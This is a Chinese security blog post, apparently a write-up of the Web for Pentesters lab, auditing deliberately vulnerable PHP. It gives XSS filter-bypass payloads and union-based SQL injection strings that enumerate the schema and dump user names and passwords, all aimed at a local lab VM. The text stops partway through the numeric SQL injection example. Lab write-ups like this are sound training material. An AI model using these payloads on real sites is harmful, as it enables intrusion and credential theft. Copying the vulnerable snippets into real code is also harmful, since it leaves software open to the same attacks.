<!DOCTYPE html>



  


<html class="theme-next mist use-motion" lang="zh-Hans">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="php,漏洞学习," />










<meta name="description" content="第一章 练习关卡0x01 xssexample1123&amp;lt;?php    echo $_GET[&quot;name&quot;];?&amp;gt; 从代码来看很很简单，通过get方式从name参数中获取url传递的数值，并且直接回显至页面，因此构造poc。http://172.16.244.130/xss/example1.php?name=%3Cscript%3Ealert(1)%3C/script%3E  exa">
<meta name="keywords" content="php,漏洞学习">
<meta property="og:type" content="article">
<meta property="og:title" content="从web-for-pentest看php代码审计">
<meta property="og:url" content="http://www.lmxspace.com/2018/05/15/从web-for-pentest看php代码审计/index.html">
<meta property="og:site_name" content="l1nk3r&#39;s blog">
<meta property="og:description" content="第一章 练习关卡0x01 xssexample1123&amp;lt;?php    echo $_GET[&quot;name&quot;];?&amp;gt; 从代码来看很很简单，通过get方式从name参数中获取url传递的数值，并且直接回显至页面，因此构造poc。http://172.16.244.130/xss/example1.php?name=%3Cscript%3Ealert(1)%3C/script%3E  exa">
<meta property="og:locale" content="zh-Hans">
<meta property="og:image" content="http://www.lmxspace.com/2018/05/15/从web-for-pentest看php代码审计/1.png">
<meta property="og:image" content="http://www.lmxspace.com/2018/05/15/从web-for-pentest看php代码审计/2.png">
<meta property="og:image" content="http://www.lmxspace.com/2018/05/15/从web-for-pentest看php代码审计/3.png">
<meta property="og:image" content="http://www.lmxspace.com/2018/05/15/从web-for-pentest看php代码审计/4.png">
<meta property="og:image" content="http://www.lmxspace.com/2018/05/15/从web-for-pentest看php代码审计/5.png">
<meta property="og:image" content="http://www.lmxspace.com/2018/05/15/从web-for-pentest看php代码审计/6.png">
<meta property="og:image" content="http://www.lmxspace.com/2018/05/15/从web-for-pentest看php代码审计/7.png">
<meta property="og:image" content="http://www.lmxspace.com/2018/05/15/从web-for-pentest看php代码审计/8.png">
<meta property="og:image" content="http://www.lmxspace.com/2018/05/15/从web-for-pentest看php代码审计/9.png">
<meta property="og:image" content="http://www.lmxspace.com/2018/05/15/从web-for-pentest看php代码审计/10.png">
<meta property="og:image" content="http://www.lmxspace.com/2018/05/15/从web-for-pentest看php代码审计/11.png">
<meta property="og:image" content="http://www.lmxspace.com/2018/05/15/从web-for-pentest看php代码审计/12.png">
<meta property="og:image" content="http://www.lmxspace.com/2018/05/15/从web-for-pentest看php代码审计/13.png">
<meta property="og:image" content="http://www.lmxspace.com/2018/05/15/从web-for-pentest看php代码审计/14.png">
<meta property="og:image" content="http://www.lmxspace.com/2018/05/15/从web-for-pentest看php代码审计/15.png">
<meta property="og:image" content="http://www.lmxspace.com/2018/05/15/从web-for-pentest看php代码审计/16.png">
<meta property="og:image" content="http://www.lmxspace.com/2018/05/15/从web-for-pentest看php代码审计/17.png">
<meta property="og:image" content="http://www.lmxspace.com/2018/05/15/从web-for-pentest看php代码审计/18.png">
<meta property="og:image" content="http://www.lmxspace.com/2018/05/15/从web-for-pentest看php代码审计/19.png">
<meta property="og:image" content="http://www.lmxspace.com/2018/05/15/从web-for-pentest看php代码审计/20.png">
<meta property="og:image" content="http://www.lmxspace.com/2018/05/15/从web-for-pentest看php代码审计/21.png">
<meta property="og:image" content="http://www.lmxspace.com/2018/05/15/从web-for-pentest看php代码审计/22.png">
<meta property="og:image" content="http://www.lmxspace.com/2018/05/15/从web-for-pentest看php代码审计/23.png">
<meta property="og:image" content="http://www.lmxspace.com/2018/05/15/从web-for-pentest看php代码审计/24.png">
<meta property="og:image" content="http://www.lmxspace.com/2018/05/15/从web-for-pentest看php代码审计/25.png">
<meta property="og:image" content="http://www.lmxspace.com/2018/05/15/从web-for-pentest看php代码审计/26.png">
<meta property="og:image" content="http://www.lmxspace.com/2018/05/15/从web-for-pentest看php代码审计/27.png">
<meta property="og:image" content="http://www.lmxspace.com/2018/05/15/从web-for-pentest看php代码审计/28.png">
<meta property="og:image" content="http://www.lmxspace.com/2018/05/15/从web-for-pentest看php代码审计/29.png">
<meta property="og:image" content="http://www.lmxspace.com/2018/05/15/从web-for-pentest看php代码审计/30.png">
<meta property="og:image" content="http://www.lmxspace.com/2018/05/15/从web-for-pentest看php代码审计/31.png">
<meta property="og:image" content="http://www.lmxspace.com/2018/05/15/从web-for-pentest看php代码审计/32.png">
<meta property="og:image" content="http://www.lmxspace.com/2018/05/15/从web-for-pentest看php代码审计/33.png">
<meta property="og:image" content="http://www.lmxspace.com/2018/05/15/从web-for-pentest看php代码审计/34.png">
<meta property="og:image" content="http://www.lmxspace.com/2018/05/15/从web-for-pentest看php代码审计/35.png">
<meta property="og:updated_time" content="2018-05-15T07:23:25.847Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="从web-for-pentest看php代码审计">
<meta name="twitter:description" content="第一章 练习关卡0x01 xssexample1123&amp;lt;?php    echo $_GET[&quot;name&quot;];?&amp;gt; 从代码来看很很简单，通过get方式从name参数中获取url传递的数值，并且直接回显至页面，因此构造poc。http://172.16.244.130/xss/example1.php?name=%3Cscript%3Ealert(1)%3C/script%3E  exa">
<meta name="twitter:image" content="http://www.lmxspace.com/2018/05/15/从web-for-pentest看php代码审计/1.png">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Mist',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://www.lmxspace.com/2018/05/15/从web-for-pentest看php代码审计/"/>





  <title>从web-for-pentest看php代码审计 | l1nk3r's blog</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">l1nk3r's blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
            
            关于
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            归档
          </a>
        </li>
      
        
        <li class="menu-item menu-item-friends">
          <a href="/Friends" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
            
            Friends
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://www.lmxspace.com/2018/05/15/从web-for-pentest看php代码审计/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="l1nk3r">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="l1nk3r's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">从web-for-pentest看php代码审计</h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-05-15T15:09:57+08:00">
                2018-05-15
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
            
              &nbsp; | &nbsp;
              <span id="/2018/05/15/从web-for-pentest看php代码审计/"class="leancloud_visitors" data-flag-title="从web-for-pentest看php代码审计">
              &nbsp;热度
              </span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/代码审计/" itemprop="url" rel="index">
                    <span itemprop="name">代码审计</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          
             <span id="/2018/05/15/从web-for-pentest看php代码审计/" class="leancloud_visitors" data-flag-title="从web-for-pentest看php代码审计">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">热度&#58;</span>
               
                 <span class="leancloud-visitors-count"></span>
                 <span>℃</span>
             </span>
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <h1 id="第一章-练习关卡"><a href="#第一章-练习关卡" class="headerlink" title="第一章 练习关卡"></a>第一章 练习关卡</h1><h2 id="0x01-xss"><a href="#0x01-xss" class="headerlink" title="0x01 xss"></a>0x01 xss</h2><h3 id="example1"><a href="#example1" class="headerlink" title="example1"></a>example1</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">   <span class="keyword">echo</span> $_GET[<span class="string">"name"</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>从代码来看很很简单，通过get方式从name参数中获取url传递的数值，并且直接回显至页面，因此构造poc。<br><code>http://172.16.244.130/xss/example1.php?name=%3Cscript%3Ealert(1)%3C/script%3E</code></p>
<p><img src="/2018/05/15/从web-for-pentest看php代码审计/1.png" alt="1"></p>
<h3 id="example2"><a href="#example2" class="headerlink" title="example2"></a>example2</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   $name =  $_GET[<span class="string">"name"</span>];</span><br><span class="line">   $name = preg_replace(<span class="string">"/&lt;script&gt;/"</span>,<span class="string">""</span>, $name);</span><br><span class="line">   $name = preg_replace(<span class="string">"/&lt;\/script&gt;/"</span>,<span class="string">""</span>, $name);</span><br><span class="line"><span class="keyword">echo</span> $name;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>这里代码做了点过滤，preg_replace() 正则替换，比如通过name传入的参数，会将<code>&lt;script&gt;</code>和<code>&lt;/script&gt;</code>替换为空，但是这里的替换对大小写敏感，所以两种渠道，一种大写绕过，一种直接在<code>&lt;script&gt;</code>标签中再加入一个标签让他替换为空，这样就oj8k了。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://172.16.244.130/xss/example2.php?name=&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/scri&lt;/script&gt;pt&gt;</span><br><span class="line">http://172.16.244.130/xss/example2.php?name=&lt;sCript&gt;alert(1)&lt;/scrIpt&gt;</span><br></pre></td></tr></table></figure>
<p><img src="/2018/05/15/从web-for-pentest看php代码审计/2.png" alt="2"></p>
<h3 id="example3"><a href="#example3" class="headerlink" title="example3"></a>example3</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   $name =  $_GET[<span class="string">"name"</span>];</span><br><span class="line">   $name = preg_replace(<span class="string">"/&lt;script&gt;/i"</span>,<span class="string">""</span>, $name);</span><br><span class="line">   $name = preg_replace(<span class="string">"/&lt;\/script&gt;/i"</span>,<span class="string">""</span>, $name);</span><br><span class="line"><span class="keyword">echo</span> $name</span><br></pre></td></tr></table></figure>
<p>example3和example2的区别就是多了这个<code>i</code>，这个东西在正则表达式中表示执行大小写不敏感的匹配，所以这里也有两种办法，一，双写<code>&lt;script&gt;</code>标签绕过，二，使用其他标签绕过。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://172.16.244.130/xss/example3.php?name=&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/sc&lt;/script&gt;ript&gt;</span><br><span class="line">http://172.16.244.130/xss/example3.php?name=&lt;img src=x onerror=alert(1)&gt;</span><br></pre></td></tr></table></figure>
<p><img src="/2018/05/15/从web-for-pentest看php代码审计/3.png" alt="3"></p>
<h3 id="example4"><a href="#example4" class="headerlink" title="example4"></a>example4</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">'/script/i'</span>, $_GET[<span class="string">"name"</span>])) &#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">"error"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">Hello <span class="meta">&lt;?php</span>  <span class="keyword">echo</span> $_GET[<span class="string">"name"</span>]; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>这里的代码之前上面的都有点不一样，这里通过大小写不敏感来检测name中是否传入了<code>script</code>，如果有直接结束，但是xss并不是只有<code>&lt;script&gt;xx&lt;/script&gt;</code>才能执行，所以换个其他标签就能绕过了。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.16.244.130/xss/example4.php?name=&lt;img src=x onerror=alert(1)&gt;</span><br></pre></td></tr></table></figure>
<p><img src="/2018/05/15/从web-for-pentest看php代码审计/4.png" alt="4"></p>
<h3 id="example5"><a href="#example5" class="headerlink" title="example5"></a>example5</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">'/alert/i'</span>, $_GET[<span class="string">"name"</span>])) &#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">"error"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">Hello <span class="meta">&lt;?php</span>  <span class="keyword">echo</span> $_GET[<span class="string">"name"</span>]; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>例子5其实和4有点像，通过正则表达式大小写不敏感来检测通过name传入的数据中是否带有alert，如果有就退出。但是有一点啊，xss不是只弹个窗，弹个窗只是证明，能够执行js啊！！！我还是用其他方式弹个窗证明存在吧，<code>confirm</code>和<code>prompt</code>也能弹窗，了解一下？</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.16.244.130/xss/example5.php?name=&lt;script&gt;confirm(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p><img src="/2018/05/15/从web-for-pentest看php代码审计/5.png" alt="5"></p>
<h3 id="example6"><a href="#example6" class="headerlink" title="example6"></a>example6</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">   <span class="keyword">var</span> $a= <span class="string">"&lt;?php  echo $_GET["</span>name<span class="string">"]; ?&gt;"</span>;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>这题和之前的都有点不同，他的输出值在<code>&lt;script&gt;</code>标签中，那其实很简单啊，要么闭合前面的<code>&lt;script&gt;</code>然后重新插入，要么直接插入，payload如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://172.16.244.130/xss/example6.php?name=hacker&lt;/script&gt;&lt;img src=x onerror=alert(1)&gt;</span><br><span class="line">http://172.16.244.130/xss/example6.php?name=hacker&quot;;alert(1);//</span><br></pre></td></tr></table></figure>
<p><img src="/2018/05/15/从web-for-pentest看php代码审计/6.png" alt="6"></p>
<h3 id="example7"><a href="#example7" class="headerlink" title="example7"></a>example7</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">   <span class="keyword">var</span> $a= <span class="string">'&lt;?php  echo htmlentities($_GET["name"]); ?&gt;'</span>;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>例子7和例子6不一样的地方在于，加入了<code>htmlentities()</code>函数，它会将html标签的<code>&lt;</code>、<code>&gt;</code>和<code>&quot;</code>实体化掉。因此无法通过闭合<code>&lt;script&gt;</code>标签的方式来解决，所以payload如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.16.244.130/xss/example7.php?name=hacker&apos;;alert(1);//</span><br></pre></td></tr></table></figure>
<p><img src="/2018/05/15/从web-for-pentest看php代码审计/7.png" alt="7"></p>
<h3 id="example8"><a href="#example8" class="headerlink" title="example8"></a>example8</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">"name"</span>])) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"HELLO "</span>.htmlentities($_POST[<span class="string">"name"</span>]);</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;form action=<span class="string">"&lt;?php echo $_SERVER['PHP_SELF']; ?&gt;"</span> method=<span class="string">"POST"</span>&gt;</span><br><span class="line">  Your name:&lt;input type=<span class="string">"text"</span> name=<span class="string">"name"</span> /&gt;</span><br><span class="line">  &lt;input type=<span class="string">"submit"</span> name=<span class="string">"submit"</span>/&gt;</span><br></pre></td></tr></table></figure>
<p>简单看看代码，name中的数据通过post方式提交到服务器，然后经过html实体化输出，所以这里不存在xss漏洞，然后在form表单中，有个<code>&lt;?php echo $_SERVER[&#39;PHP_SELF&#39;]; ?&gt;</code>。简单说一下<code>$_SERVER[&#39;PHP_SELF&#39;]</code>这个东西是干嘛用的，当前执行脚本的文件名，与 document root 有关。例如，在地址为 <code>http://xxx.com/foo/bar.php</code> 的脚本中使用 <code>$_SERVER[&#39;PHP_SELF&#39;]</code> 将得到 /foo/bar.php。所以到这里应该知道如何构造poyload了吧：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.248.130/xss/example8.php/&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p><img src="/2018/05/15/从web-for-pentest看php代码审计/8.png" alt="8"></p>
<h3 id="example9"><a href="#example9" class="headerlink" title="example9"></a>example9</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">  <span class="built_in">document</span>.write(location.hash.substring(<span class="number">1</span>));</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>这题代码一看就知道是dom-xss了。所谓的dom-xss其实是浏览器本地dom树直接解析了，不会像服务器发起数据包请求。而location是javascript里边管理地址栏的内置对象，location对象：设置或获取当前URL的信息。使用location对象可以设置或返回URL中的一些信息，一个完整的URL地址的格式为：协议://主机:端口/路径名称?搜索条件#hash标识。构造payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.248.130/xss/example9.php#&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>这里一直被firefox坑，<del>动不动url编码，气哭我</del>。</p>
<p><img src="/2018/05/15/从web-for-pentest看php代码审计/9.png" alt="9"></p>
<p>最后换个浏览器解决，辣鸡火狐。</p>
<p><img src="/2018/05/15/从web-for-pentest看php代码审计/10.png" alt="10"></p>
<h2 id="0x02-SQL注入"><a href="#0x02-SQL注入" class="headerlink" title="0x02 SQL注入"></a>0x02 SQL注入</h2><h3 id="example1-1"><a href="#example1-1" class="headerlink" title="example1"></a>example1</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$sql = <span class="string">"SELECT * FROM users where name='"</span>;</span><br><span class="line">$sql .= $_GET[<span class="string">"name"</span>].<span class="string">"'"</span>;	</span><br><span class="line">$result = mysql_query($sql);</span><br></pre></td></tr></table></figure>
<p>这里就两行代码，这里的<code>$sql</code>变量直接拼接sql语句，以及通过get方式传递进来的数据，因此存在sql注入攻击。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">name=root&apos; order by 6%23        //第6列报错，所以应该是5列</span><br><span class="line">name=root&apos; union select SCHEMA_NAME,2,3,4,5 from information_schema.SCHEMATA%23  //所有数据库名字</span><br><span class="line">name=root&apos; union select 1,2,database(),4,5%23 //当前数据库名为exercises</span><br><span class="line">name=root&apos; union select table_name,2,3,4,5 from  information_schema.tables%23    //猜解全部表名</span><br><span class="line">name=root&apos; union select table_name,2,3,4,5 from  information_schema.tables where table_schema= database()%23                   //当前数据库中的表名为users</span><br><span class="line">name=root&apos; union select COLUMN_NAME,2,3,4,5 from information_schema.COLUMNS where table_name = &apos;users&apos;%23                      //猜解列名</span><br><span class="line">name=root&apos; union select name,passwd,3,4,5 from exercises.users%23   //获取列中的值</span><br></pre></td></tr></table></figure>
<p><img src="/2018/05/15/从web-for-pentest看php代码审计/11.png" alt="11"></p>
<h3 id="example2-1"><a href="#example2-1" class="headerlink" title="example2"></a>example2</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">'/ /'</span>, $_GET[<span class="string">"name"</span>])) &#123;</span><br><span class="line">   <span class="keyword">die</span>(<span class="string">"ERROR NO SPACE"</span>); </span><br><span class="line">&#125;</span><br><span class="line">$sql = <span class="string">"SELECT * FROM users where name='"</span>;</span><br><span class="line">$sql .= $_GET[<span class="string">"name"</span>].<span class="string">"'"</span>;</span><br></pre></td></tr></table></figure>
<p>这段代码和上面的代码不同之处就是过滤了空格，但是据我所知，mysql下绕过空格有这几种方法：<br>1、水平制表(HT) url编码：%09<br>2、注释绕过空格 /注释/<br>常用的注释符：<code>//</code>,<code>—</code> ,<code>/**/</code>,<code>#</code>,<code>—+</code>, <code>— -</code>,<code>;</code>,<code>%00</code>,<code>—a</code><br>这里我们用<code>/**/</code>和<code>%09</code>来绕过空格</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?name=root&apos;/**/union/**/select/**/name,passwd,3,4,5/**/from/**/exercises.users%23 </span><br><span class="line">?name=root&apos;%09union%09select%09name,passwd,3,4,5%09from%09exercises.users%23</span><br></pre></td></tr></table></figure>
<p><img src="/2018/05/15/从web-for-pentest看php代码审计/12.png" alt="12"></p>
<h3 id="example3-1"><a href="#example3-1" class="headerlink" title="example3"></a>example3</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">'/\s+/'</span>, $_GET[<span class="string">"name"</span>])) &#123;</span><br><span class="line">   <span class="keyword">die</span>(<span class="string">"ERROR NO SPACE"</span>); </span><br><span class="line">&#125;</span><br><span class="line">$sql = <span class="string">"SELECT * FROM users where name='"</span>;</span><br><span class="line">$sql .= $_GET[<span class="string">"name"</span>].<span class="string">"'"</span>;</span><br></pre></td></tr></table></figure>
<p>这段代码和上面不同的一点在于，正则表达式里面的内容变成了<code>\s</code>。正则表达式中\s匹配任何空白字符，包括空格、制表符、换页符等等, 等价于[ \f\n\r\t\v]</p>
<ul>
<li>\f -&gt; 匹配一个换页</li>
<li>\n -&gt; 匹配一个换行符</li>
<li>\r -&gt; 匹配一个回车符</li>
<li>\t -&gt; 匹配一个制表符</li>
<li>\v -&gt; 匹配一个垂直制表符</li>
</ul>
<p>而“\s+”则表示匹配任意多个上面的字符。因此这里通过水平制表符绕过空格的方法已经不行了，但是，还是可以通过注释来绕过空格。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=root&apos;/**/union/**/select/**/name,passwd,3,4,5/**/from/**/exercises.users%23</span><br></pre></td></tr></table></figure>
<p><img src="/2018/05/15/从web-for-pentest看php代码审计/13.png" alt="13"></p>
<h3 id="example4-1"><a href="#example4-1" class="headerlink" title="example4"></a>example4</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">"SELECT * FROM users where id="</span>;</span><br><span class="line">$sql.=mysql_real_escape_string($_GET[<span class="string">"id"</span>]).<span class="string">" "</span>;</span><br><span class="line">$result = mysql_query($sql);</span><br></pre></td></tr></table></figure>
<p>这段代码和上面的就不一样，这里也是有注入，我们看个函数<code>mysql_real_escape_string()</code>函数转义 SQL 语句中使用的字符串中的特殊字符。<br>这些字符受影响：<code>\x00</code>，<code>\n</code>，<code>\r</code>，<code>\</code>，<code>&#39;</code>，<code>&quot;</code>，<code>\x1a</code>。<br>从数据库中看到，这里的id是数字型，所以这里存在数字型注入。<img src="/2018/05/15/从web-for-pentest看php代码审计/14.png" alt="14"></p>
<p>当我执行查询的时候，mysql其实会做强制的类型转换，举个例子。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">id</span> = <span class="string">'1abcd'</span>;</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">id</span> = <span class="string">'abdc'</span>;</span><br></pre></td></tr></table></figure>
<p><img src="/2018/05/15/从web-for-pentest看php代码审计/15.png" alt="15"></p>
